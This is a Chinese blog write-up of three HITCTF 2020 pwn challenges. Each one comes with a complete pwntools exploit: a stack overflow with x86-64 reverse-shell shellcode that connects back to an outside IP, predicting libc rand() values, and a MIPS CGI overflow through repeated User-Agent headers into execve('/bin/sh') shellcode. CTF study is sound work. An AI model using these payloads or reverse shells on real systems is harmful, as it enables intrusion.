---
title: HITCTF 2020 三道 Pwn
date: 2020-12-09 00:00:02
categories:
- CTF/Pwn
tags: HITCTF mips
---

> 更新中...比较简单的Pwn，其中的MIPS Pwn是人生中拿到的第一个Pwn的一血，全是4哥的功劳。

总共五道题，做出来三道，题目全在这了：[pwn.zip](https://xuanxuanblingbling.github.io/assets/attachment/hitctf/sniff.pcap)

## dagongren1

媳妇博客：[hitctf2020之dagognren1](https://blingblingxuanxuan.github.io/hitctf2020-dagongren1.html)

- 漏洞：main函数scanf栈溢出
- 利用：栈迁移+反弹shell

```python
from pwn import *
context(arch="amd64",os='linux')
#myelf = ELF("./dagongren1")
#io = process(myelf.path)
io = remote("81.70.209.171",51601)

shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x95\x81\x23\x3d\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"

io.recv()
#gdb.attach(io,"b * 0x400736")
io.sendline('a'*32+p64(0x600E40)+p64(0x4006FC))
sleep(1)
io.sendline('a'*32+p64(0x0)+p64(0x600e50)+shellcode)
io.interactive()
```

## lucky

- 漏洞：可预测的随机数
- 利用：本地预测随机数

```python
from pwn import *
from ctypes import *
context.log_level = "debug"
 
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(libc.time(0)/0xA+1)
myelf = ELF("./lucky")
#io = process(myelf.path)
io = remote("81.70.209.171",51700)
io.recv()
io.sendline("xuan")
for i in range(100):
    io.recv()
    io.sendline(str(libc.rand()))
io.interactive()
```

## supercgi

- 漏洞：多个`User-Agent`字段可以触发栈溢出（瞎发包测出来的，溢出点估计个大概，但原因比赛时没看明白）
- 利用：return 2 shellcode

> 开始用的ROP直接用程序函数打印flag，本地成功，远程失败，本地挂socat失败，原因不详，后来询问出题人，发现预期解是执行了`cat flag`，果断用shellcode

```python
from pwn import *
context(arch='mips',os='linux',endian='little')

buf =  b""
buf += b"\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0"
buf += b"\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff"
buf += b"\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02"
buf += b"\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00"

payload = '''GET /index.html HTTP/1.1
User-Agent: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa//flag\x00
User-Agent: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
User-Agent: %s
User-Agent: %s
User-Agent: %s

'''% (
    ('b'*187+p32(0x412f20)+'a'*5+buf),
    ('c'*78+p32(0x412f20)),
    ('d'*179+p32(0x412f20))
    ) 
#myelf = ELF("./SuperCgi")
#io = process(["qemu-mipsel","-g","1234",myelf.path])
#io = process(["qemu-mipsel",myelf.path])
#raw_input()
io = remote("81.70.209.171",50603)
#io = remote("127.0.0.1",1111)
#raw_input()
#sleep(1)
io.send(payload)
io.interactive()
```